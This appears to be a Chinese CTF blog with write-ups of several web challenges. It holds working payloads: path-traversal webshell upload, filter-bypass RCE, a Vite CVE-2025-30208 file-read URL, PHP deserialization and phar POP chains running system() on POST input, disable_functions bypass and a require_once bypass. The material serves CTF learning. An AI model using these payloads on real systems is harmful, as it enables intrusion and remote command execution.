filename=&quot;../../var/www/html/shell.php&quot;//若服务器直接使用filename拼接存储路径，可能导致文件被写入/var/www/html/。\n\n注意到可传入name参数来控制文件名，同时basename并没有对name参数进行清洗，$img_path是由文件名直接拼接得到，存在目录穿越漏洞，因此我们可以将文件上传到&#x2F;var&#x2F;www&#x2F;html目录中，配合.user.ini实现对非.php文件的解析，上线webshell：\n我们知道文件保存路径为/var/www/html/uploads/在html根目录下有php文件。我们两次上传文本马和.user.ini即可\n先上传.user.ini\n\n\n在上传door.txt到目录下即可\n\n\n不用管那个报错，我们上传成功了\n\n\n然后我们直接使用蚁剑连接即可，回来了发现flag没有放在根目录下，我根本找不到，看了大佬的才知道\npass=system(&#x27;env&#x27;);//env 命令会显示当前进程的所有环境变量\n\n\n\n\n\n5.AAA偷渡阴平（复仇）好一个复仇，又是我不会写的题目，唉\n&lt;?php$tgctf2025=$_GET[&#x27;tgctf2025&#x27;];if(!preg_match(&quot;/0|1|[3-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;, $tgctf2025))&#123;    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi    eval($tgctf2025);&#125;else&#123;    die(&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;);&#125;highlight_file(__FILE__); \n\n这次过滤的东西太多了，不仅把get_defined_vars()过滤掉了，还把getallheaders()过滤了，看来根本就不想让我们用无参RCE，我还傻逼的在那里看\n看了wp，我只能说出题的套路太深了，根本搞不来一点\n用这个方法，普通版和复仇版可以用同一个payload\n?tgctf2025=session_start();system(hex2bin(session_id()));PHPSESSID=636174202f666c6167       //cat /flag的十六进制\n\nsession_start();后请求头中就多了PHPSESSID这个参数，原来是服务器用了识别用户的，但是我们这里可以用session_id()来获取到我们请求头传递到的cookie中的PHPSESSIONID\n\n\n虽然过滤掉了我认识的函数，但肯定还有非预期解\n/?tgctf2025=system(implode(apache_request_headers()));\n\napache_request_headers()与 getallheaders() 的关系\n\ngetallheaders() 是 apache_request_headers() 的别名\n两者功能完全相同\n推荐使用 getallheaders() 以获得更好的可读性\n\n按理来说apache_request_headers()应该只能获得apache服务器的请求头信息，但题目的服务器是nginx的这搞不好是题目的问题，作为一个备用解法吧\nimplode() 是 PHP 中用于将数组元素连接成字符串的函数。\n这个payload不能直接用不说，那个数组的顺序和之前还不一样，而且还不能用那些取值函数，只能通过请求头去尝试，Payload只有那么点长，但请求头太难构造了\n由于为了方便尝试，我用的是原版的，那样可以用var_dump()看数组，这里面比如Host不能为空，有一些项能为空但不能删除，不然会自动触发content-length\nGET /?tgctf2025=system(implode(apache_request_headers())); HTTP/1.1Host:  gUser-Agent: Accept: aAccept-Language:  lAccept-Encoding: fConnection: /Upgrade-Insecure-Requests:$&#123;IFS&#125;Sec-Fetch-Dest: tSec-Fetch-Mode:a Sec-Fetch-Site: cContent-Type: Sec-Fetch-User: Priority: Pragma: Cache-Control: \n\n\n\n还有就是这个排列顺序的问题，就是我用apache_request_headers()的时候他用的是apache的发送的原始顺序返回，但是当我用getallheaders()的时候则是以nginx的字母排序\n6.前端GAME和这题目比起来，其他题目算好的了，没学过的东西果然一点思路都没有\n我们首先玩小游戏玩到20分或者直接在源代码里面找可以知道flag在/tgflagggg目录下，后面的就什么都不知道了\n1.Vite CVE-2025-30208 安全漏洞这个题目用到了这个我感觉根本没地方下手的漏洞，\n漏洞概述\nCVE-2025-30208 是 Vite（一个前端开发工具提供商）在特定版本中存在的安全漏洞。此漏洞允许攻击者通过特殊的 URL 参数绕过对文件系统的访问限制，从而获取任意文件内容（包括非 Vite 服务目录范围外的文件）。\n漏洞原理\n\nVite 在开发服务器模式下提供了 @fs 用于访问服务允许范围内的文件。\n本应对超出范围的文件请求返回 403 Restricted；然而，在请求 URL 中添加 ?raw?? 或 ?import&amp;raw?? 时，可以绕过原有检查。\n这是由于在多个处理环节中会移除类似 ? 的结尾分隔符，但并未在查询字符串的正则匹配中考虑这一点；攻击者可利用这一缺陷读取目标文件内容。\n\n原理我现在是不可能了解的，只能记一下payload\n/@fs/tgflagggg?import&amp;raw??/@fs/tgflagggg?raw??上面两种方法都是可以的\n\n\n\n7.什么文件上传？开头是一个文件上传的界面，差点就以为是文件上传了，但是看了一下页面源代码发现提示访问robots.txt，于是拿到\nUser-Agent: *Disallow: /admin/Disallow: /private/Disallow: /baiduDisallow: /s?Disallow: /unlinkDisallow: /pharDisallow: !@*($^&amp;*!@^&amp;!*(@$# &lt;--!文件上传后缀是三个小写字母 !@#$*&amp;^(!%@#$#^&amp;!--&gt;Disallow: /class.php\n\n我们先依次访问\n成功拿到class.php\n&lt;?php    highlight_file(__FILE__);    error_reporting(0);    function best64_decode($str)    &#123;        return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str)))));    &#125;    class yesterday &#123;        public $learn;        public $study=&quot;study&quot;;        public $try;        public function __construct()        &#123;            $this-&gt;learn = &quot;learn&lt;br&gt;&quot;;        &#125;        public function __destruct()        &#123;            echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;            return $this-&gt;study-&gt;hard();        &#125;    &#125;    class today &#123;        public $doing;        public $did;        public $done;        public function __construct()&#123;            $this-&gt;did = &quot;What you did makes you outstanding.&lt;br&gt;&quot;;        &#125;        public function __call($arg1, $arg2)        &#123;            $this-&gt;done = &quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;;            echo $this-&gt;done;            if(md5(md5($this-&gt;doing))==666)&#123;                return $this-&gt;doing();            &#125;            else&#123;                return $this-&gt;doing-&gt;better;            &#125;        &#125;    &#125;    class tommoraw &#123;        public $good;        public $bad;        public $soso;        public function __invoke()&#123;            $this-&gt;good=&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;;            echo $this-&gt;good;        &#125;        public function __get($arg1)&#123;            $this-&gt;bad=&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;;        &#125;    &#125;    class future&#123;        private $impossible=&quot;How can you get here?&lt;br&gt;&quot;;        private $out;        private $no;        public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;        public function __set($arg1, $arg2) &#123;            if ($this-&gt;out-&gt;useful7) &#123;                echo &quot;Seven is my lucky number&lt;br&gt;&quot;;                system(&#x27;whoami&#x27;);            &#125;        &#125;        public function __toString()&#123;            echo &quot;This is your future.&lt;br&gt;&quot;;            system($_POST[&quot;wow&quot;]);            return &quot;win&quot;;        &#125;        public function __destruct()&#123;            $this-&gt;no = &quot;no&quot;;            return $this-&gt;no;        &#125;    &#125;    if (file_exists($_GET[&#x27;filename&#x27;]))&#123;        echo &quot;Focus on the previous step!&lt;br&gt;&quot;;    &#125;    else&#123;        $data=substr($_GET[&#x27;filename&#x27;],0,-4);        unserialize(best64_decode($data));    &#125;    // You learn yesterday, you choose today, can you get to your future? \n\n这一看就是php序列化，这么说和文件上传没任何关系，直接命令执行\n这个题目的出发点是__destruct，结束点是__tostring，但让我很不理解的就是怎么触发tostring这个方法\n&lt;?phpfunction best64_encode($str)&#123;    return base64_encode(base64_encode(base64_encode(base64_encode(base64_encode($str)))));&#125;class yesterday &#123;    public $learn;    public $study=&quot;study&quot;;    public $try;    public function __construct()    &#123;        $this-&gt;learn = &quot;learn&lt;br&gt;&quot;;    &#125;    public function __destruct()    &#123;        echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;        return $this-&gt;study-&gt;hard();    &#125;&#125;class today &#123;    public $doing;    public $did;    public $done;    public function __construct()&#123;        $this-&gt;did = &quot;What you did makes you outstanding.&lt;br&gt;&quot;;    &#125;    public function __call($arg1, $arg2)    &#123;        $this-&gt;done = &quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;;        echo $this-&gt;done;        if(md5(md5($this-&gt;doing))==666)&#123;            return $this-&gt;doing();        &#125;        else&#123;            return $this-&gt;doing-&gt;better;        &#125;    &#125;&#125;class tommoraw &#123;    public $good;    public $bad;    public $soso;    public function __invoke()&#123;        $this-&gt;good=&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;;        echo $this-&gt;good;    &#125;    public function __get($arg1)&#123;        $this-&gt;bad=&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;;    &#125;&#125;class future&#123;    private $impossible=&quot;How can you get here?&lt;br&gt;&quot;;    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __set($arg1, $arg2) &#123;        if ($this-&gt;out-&gt;useful7) &#123;            echo &quot;Seven is my lucky number&lt;br&gt;&quot;;            system(&#x27;whoami&#x27;);        &#125;    &#125;    public function __toString()&#123;        echo &quot;This is your future.&lt;br&gt;&quot;;        system($_POST[&quot;wow&quot;]);        return &quot;win&quot;;    &#125;    public function __destruct()&#123;        $this-&gt;no = &quot;no&quot;;        return $this-&gt;no;    &#125;&#125;$yesterday = new yesterday();$yesterday-&gt;study=new today();$yesterday-&gt;study-&gt;doing=new future();echo best64_encode(serialize($yesterday));//O:9:&quot;yesterday&quot;:3:&#123;s:5:&quot;learn&quot;;s:9:&quot;learn&lt;br&gt;&quot;;s:5:&quot;study&quot;;O:5:&quot;today&quot;:3:&#123;s:5:&quot;doing&quot;;O:6:&quot;future&quot;:23:&#123;s:18:&quot; future impossible&quot;;s:25:&quot;How can you get here?&lt;br&gt;&quot;;s:11:&quot; future out&quot;;N;s:10:&quot; future no&quot;;N;s:7:&quot;useful1&quot;;N;s:7:&quot;useful2&quot;;N;s:7:&quot;useful3&quot;;N;s:7:&quot;useful4&quot;;N;s:7:&quot;useful5&quot;;N;s:7:&quot;useful6&quot;;N;s:7:&quot;useful7&quot;;N;s:7:&quot;useful8&quot;;N;s:7:&quot;useful9&quot;;N;s:8:&quot;useful10&quot;;N;s:8:&quot;useful11&quot;;N;s:8:&quot;useful12&quot;;N;s:8:&quot;useful13&quot;;N;s:8:&quot;useful14&quot;;N;s:8:&quot;useful15&quot;;N;s:8:&quot;useful16&quot;;N;s:8:&quot;useful17&quot;;N;s:8:&quot;useful18&quot;;N;s:8:&quot;useful19&quot;;N;s:8:&quot;useful20&quot;;N;&#125;s:3:&quot;did&quot;;s:39:&quot;What you did makes you outstanding.&lt;br&gt;&quot;;s:4:&quot;done&quot;;N;&#125;s:3:&quot;try&quot;;N;&#125;You studied hard yesterday.&lt;br&gt;And what you&#x27;ve done has given you a choice.&lt;br&gt;This is your future.&lt;br&gt;//我们只对yestday进行序列化 但是在结果里面有future，也就表示pop链构建成功//Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=You studied hard yesterday.&lt;br&gt;And what you&#x27;ve done has given you a choice.&lt;br&gt;This is your future.&lt;br&gt;\n\n我们需要注意的是源代码对其进行了好几次解码，我们也需要对其进行对应次数的编码\n还有就是没用到的属性其实可以不写，但是我没有删掉导致编码好长\n8.什么文件上传？（复仇）//class.php&lt;?phphighlight_file(__FILE__);error_reporting(0);function best64_decode($str)&#123;    return base64_encode(md5(base64_encode(md5($str))));    &#125;class yesterday &#123;    public $learn;    public $study=&quot;study&quot;;    public $try;    public function __construct()    &#123;        $this-&gt;learn = &quot;learn&lt;br&gt;&quot;;    &#125;    public function __destruct()    &#123;        echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;        return $this-&gt;study-&gt;hard();    &#125;&#125;class today &#123;    public $doing;    public $did;    public $done;    public function __construct()&#123;        $this-&gt;did = &quot;What you did makes you outstanding.&lt;br&gt;&quot;;    &#125;    public function __call($arg1, $arg2)    &#123;        $this-&gt;done = &quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;;        echo $this-&gt;done;        if(md5(md5($this-&gt;doing))==666)&#123;            return $this-&gt;doing();        &#125;        else&#123;            return $this-&gt;doing-&gt;better;        &#125;    &#125;&#125;class tommoraw &#123;    public $good;    public $bad;    public $soso;    public function __invoke()&#123;        $this-&gt;good=&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;;        echo $this-&gt;good;    &#125;    public function __get($arg1)&#123;        $this-&gt;bad=&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;;    &#125;&#125;class future&#123;    private $impossible=&quot;How can you get here?&lt;br&gt;&quot;;    private $out;    private $no;    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;    public function __set($arg1, $arg2) &#123;        if ($this-&gt;out-&gt;useful7) &#123;            echo &quot;Seven is my lucky number&lt;br&gt;&quot;;            system(&#x27;whoami&#x27;);        &#125;    &#125;    public function __toString()&#123;        echo &quot;This is your future.&lt;br&gt;&quot;;        system($_POST[&quot;wow&quot;]);        return &quot;win&quot;;    &#125;    public function __destruct()&#123;        $this-&gt;no = &quot;no&quot;;        return $this-&gt;no;    &#125;&#125;if (file_exists($_GET[&#x27;filename&#x27;]))&#123;    echo &quot;Focus on the previous step!&lt;br&gt;&quot;;&#125;else&#123;    $data=substr($_GET[&#x27;filename&#x27;],0,-4);    unserialize(best64($data));&#125;// You learn yesterday, you choose today, can you get to your future? \n\n这个class.php好像和原版没什么区别，直接用上次的payload试一下，但是好像什么回显都没有，仔细一看发现编码那里把base64换成了MD5，那样我们就不能直接传编码了\n这个时候phar还是来了吗\n但是我们想要文件上传有一点难，因为各种后缀都试过了都不行，后面只能爆破发现只有将.atg后缀的文件可以上传(这是什么鬼后缀)\n怎么不对劲，怎么还加了一个tomorrow的类(搞错了，原来那个类一直都在，但是没用到，删除了也无所谓)\n由于类没有变，我们只要把类写进phar里面即可，他会自己序列化的\n&lt;?phpclass yesterday &#123;    public $study=&quot;study&quot;;    public function __destruct()    &#123;        echo &quot;You studied hard yesterday.&lt;br&gt;&quot;;        return $this-&gt;study-&gt;hard();    &#125;&#125;class today &#123;    public $doing;    public function __call($arg1, $arg2)    &#123;        if(md5(md5($this-&gt;doing))==666)&#123;            return $this-&gt;doing();        &#125;        else&#123;            return $this-&gt;doing-&gt;better;        &#125;    &#125;&#125;class future&#123;    public function __toString()&#123;        echo &quot;This is your future.&lt;br&gt;&quot;;        system($_POST[&quot;wow&quot;]);        return &quot;win&quot;;    &#125;&#125;$phar=new phar(&#x27;test.phar&#x27;);//后缀名必须为phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//设置stub$yesterday=new yesterday();$yesterday-&gt;study=new today();$yesterday-&gt;study-&gt;doing=new future();$phar-&gt;setMetadata($yesterday);//自定义的meta-data存入manifest//会自动进行序列化$phar-&gt;addFromString(&quot;flag.txt&quot;,&quot;flag&quot;);//添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;\n\n我们在限定后缀的情况下仍然能够上传phar文件得益于phar进行检测文件头\n我们把phar.atg写入后返回uploads/phar.atg我们在class.php界面使用phar伪协议让其读取phar文件即可成功反序列化，不需要通过best64()\n然后发现这次目录下又找不到flag了，下次找不到flag直接env\npayload\n?filename=phar://uploads/phar.atgwow=env\n\n9."},{"title":"Wallbreaker_Easy","url":"/2025/06/04/Wallbreaker-Easy/","content":"Wallbreaker_Easy这个题目有意思了，刚上来就提示我们有一句话木马\n\n\n但是我们尝试进行命令执行发现没有任何反应于是加载phpinfo();\n\n\n发现disable禁掉了我所有的命令执行函数，于是直接上蚁剑\n另外说一下，这个题目如果我不用蚁剑的插件是绝对做不出来的，那些其他方法全都是大佬才会的\n我们在目录下发现了三个疑似flag的文件\n\n\n先打开flag，发现是空的，以为是权限不够，但是在命令行中打开也是空的\n后面打开readflag发现一堆乱码，之前做杂项的时候遇到过文件头和尾都不匹配的文件有可能是个可执行文件\n至于readflag.c则是用system函数cat readflag。尝试在命令行中运行这两个文件，都没有flag，还有就是无论运行什么命令拿到的都是ret&#x3D;127\n\n\n这个时候就是命令执行函数被禁用了，使用diasable_function插件，我们选择PHP_GC_UAF这个插件进行绕过\n然后我们运行&#x2F;readflag这个文件即可\n"},{"title":"[WMCTF2020]Make_PHP_Great_Again_2.0","url":"/2025/05/14/WMCTF2020-Make-PHP-Great-Again-2-0/","content":"[WMCTF2020]Make_PHP_Great_Again_2.0&lt;?phphighlight_file(__FILE__);require_once &#x27;flag.php&#x27;;if(isset($_GET[&#x27;file&#x27;])) &#123;  require_once $_GET[&#x27;file&#x27;];&#125;\n\n看见这个代码，感觉似曾相识，和之前的题目代码都一样，但是我还是想不起解法\n看了wp，感觉和条件竞争有相似的地方\n这个题目先直接上payload\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n\n这个题目我们发现有这么一个路径，/proc/self/root这个路径重复多次\n/proc/self/指向的是Linux系统当前进程，/proc/self/root是Linux系统的符号链接，指向当前进程的根目录（通常是 /）\n通过多次重复 /proc/self/root，构造一个超长路径，但最终仍指向 /var/www/html/flag.php。\n关键点：PHP的路径规范化（realpath）在处理超长路径时可能存在逻辑问题，导致 require_once 无法正确去重。\n至于为什么可以绕过require_once\n\n路径规范化失败：  PHP的 realpath() 函数在解析超长路径时可能会因为缓冲区限制或递归处理失败，返回未规范化的路径（如保留 /proc/self/root 的原始形式）。\nrequire_once 依赖 realpath 的结果判断是否重复包含。如果规范化失败，它会认为 /proc/self/root/.../flag.php 和 /var/www/html/flag.php 是不同文件，从而绕过限制。\n\n也就是文件路径重复太多次了，但是指向的还是flag.php这个路径导致php对路径处理失败，从而重复包含相同文件\n"},{"title":"[XDCTF_2015]filemanager","url":"/2025/06/04/XDCTF-2015-filemanager/","content":"[XDCTF_2015]filemanager好好的文件上传怎么就这么难啊，文件上传结合sql结合代码审计，这辈子无了\n题目进入是一个文件上传界面，我们可以上传文件，并进行删除、改名操作，但是改名不能改后缀，尝试了一下发现被白名单过滤了，目测只能上传图片\n这个题目自带源码于是我们肯定得自己去看看\n我们先来看负责文件上传的upload.php去\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午8:45 */require_once &quot;common.inc.php&quot;;if ($_FILES) &#123;\t$file = $_FILES[&quot;upfile&quot;];\tif ($file[&quot;error&quot;] == UPLOAD_ERR_OK) &#123;\t\t$name = basename($file[&quot;name&quot;]);\t\t$path_parts = pathinfo($name);\t\tif (!in_array($path_parts[&quot;extension&quot;], array(&quot;gif&quot;, &quot;jpg&quot;, &quot;png&quot;, &quot;zip&quot;, &quot;txt&quot;))) &#123;\t\t\texit(&quot;error extension&quot;);\t\t&#125;\t\t$path_parts[&quot;extension&quot;] = &quot;.&quot; . $path_parts[&quot;extension&quot;];\t\t$name = $path_parts[&quot;filename&quot;] . $path_parts[&quot;extension&quot;];\t\t// $path_parts[&quot;filename&quot;] = $db-&gt;quote($path_parts[&quot;filename&quot;]);\t\t// Fix\t\t$path_parts[&#x27;filename&#x27;] = addslashes($path_parts[&#x27;filename&#x27;]);\t\t$sql = &quot;select * from `file` where `filename`=&#x27;&#123;$path_parts[&#x27;filename&#x27;]&#125;&#x27; and `extension`=&#x27;&#123;$path_parts[&#x27;extension&#x27;]&#125;&#x27;&quot;;\t\t$fetch = $db-&gt;query($sql);\t\tif ($fetch-&gt;num_rows &gt; 0) &#123;\t\t\texit(&quot;file is exists&quot;);\t\t&#125;\t\tif (move_uploaded_file($file[&quot;tmp_name&quot;], UPLOAD_DIR . $name)) &#123;\t\t\t$sql = &quot;insert into `file` ( `filename`, `view`, `extension`) values( &#x27;&#123;$path_parts[&#x27;filename&#x27;]&#125;&#x27;, 0, &#x27;&#123;$path_parts[&#x27;extension&#x27;]&#125;&#x27;)&quot;;\t\t\t$re = $db-&gt;query($sql);\t\t\tif (!$re) &#123;\t\t\t\tprint_r($db-&gt;error);\t\t\t\texit;\t\t\t&#125;\t\t\t$url = &quot;/&quot; . UPLOAD_DIR . $name;\t\t\techo &quot;Your file is upload, url:                &lt;a href=\\&quot;&#123;$url&#125;\\&quot; target=&#x27;_blank&#x27;&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;                &lt;a href=\\&quot;/\\&quot;&gt;go back&lt;/a&gt;&quot;;\t\t&#125; else &#123;\t\t\texit(&quot;upload error&quot;);\t\t&#125;\t&#125; else &#123;\t\tprint_r(error_get_last());\t\texit;\t&#125;&#125;\n\n慢慢看完我以为可以在文件名上进行一次sql注入的时候，又转念一想注出来也没用啊，flag应该也不在数据库中，也不能用load_file写马，看了wp发现了一个其他文件\ncommon.inc.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午7:58 */$DATABASE = array(\t&quot;host&quot; =&gt; &quot;127.0.0.1&quot;,\t&quot;username&quot; =&gt; &quot;root&quot;,\t&quot;password&quot; =&gt; &quot;ayshbdfuybwayfgby&quot;,\t&quot;dbname&quot; =&gt; &quot;xdctf&quot;,);$db = new mysqli($DATABASE[&#x27;host&#x27;], $DATABASE[&#x27;username&#x27;], $DATABASE[&#x27;password&#x27;], $DATABASE[&#x27;dbname&#x27;]);$req = array();foreach (array($_GET, $_POST, $_COOKIE) as $global_var) &#123;\tforeach ($global_var as $key =&gt; $value) &#123;\t\tis_string($value) &amp;&amp; $req[$key] = addslashes($value);//addslashes对数据进行转义\t&#125;&#125;define(&quot;UPLOAD_DIR&quot;, &quot;upload/&quot;);function redirect($location) &#123;\theader(&quot;Location: &#123;$location&#125;&quot;);\texit;&#125;\n\naddslashes() 是 PHP 中用于在特定字符前添加反斜杠的转义函数，主要用于字符串在数据库查询等场景中的安全处理。\n也就是说我们的所有输入全都被转义了，无法直接注入\n也就是说我们只能寄希望于用于改名的rename.php\n&lt;?php/** * Created by PhpStorm. * User: phithon * Date: 15/10/14 * Time: 下午9:39 */require_once &quot;common.inc.php&quot;;//也是进行转义了if (isset($req[&#x27;oldname&#x27;]) &amp;&amp; isset($req[&#x27;newname&#x27;])) &#123;\t$result = $db-&gt;query(&quot;select * from `file` where `filename`=&#x27;&#123;$req[&#x27;oldname&#x27;]&#125;&#x27;&quot;);\tif ($result-&gt;num_rows &gt; 0) &#123;\t\t$result = $result-&gt;fetch_assoc();\t&#125; else &#123;\t\texit(&quot;old file doesn&#x27;t exists!&quot;);\t&#125;\tif ($result) &#123;\t\t$req[&#x27;newname&#x27;] = basename($req[&#x27;newname&#x27;]);\t\t$re = $db-&gt;query(&quot;update `file` set `filename`=&#x27;&#123;$req[&#x27;newname&#x27;]&#125;&#x27;, `oldname`=&#x27;&#123;$result[&#x27;filename&#x27;]&#125;&#x27; where `fid`=&#123;$result[&#x27;fid&#x27;]&#125;&quot;);\t\tif (!$re) &#123;\t\t\tprint_r($db-&gt;error);\t\t\texit;\t\t&#125;\t\t$oldname = UPLOAD_DIR . $result[&quot;filename&quot;] . $result[&quot;extension&quot;];\t\t$newname = UPLOAD_DIR . $req[&quot;newname&quot;] . $result[&quot;extension&quot;];\t\tif (file_exists($oldname)) &#123;\t\t\trename($oldname, $newname);\t\t&#125;\t\t$url = &quot;/&quot; . $newname;\t\techo &quot;Your file is rename, url:                &lt;a href=\\&quot;&#123;$url&#125;\\&quot; target=&#x27;_blank&#x27;&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;                &lt;a href=\\&quot;/\\&quot;&gt;go back&lt;/a&gt;&quot;;\t&#125;&#125;?&gt;\n\n这个文件进行了一个简单的sql的select查询老名字和update文件名的操作，即使想到二次注入也没思路，只能看题解了。\n看了wp后稍微理解了一下，就是通过源码得知有filename和extension这两个列，我们在改名的时候会出现一个select语句和update语句\n$result = $db-&gt;query(&quot;select * from `file` where `filename`=&#x27;&#123;$req[&#x27;oldname&#x27;]&#125;&#x27;&quot;);$re = $db-&gt;query(&quot;update `file` set 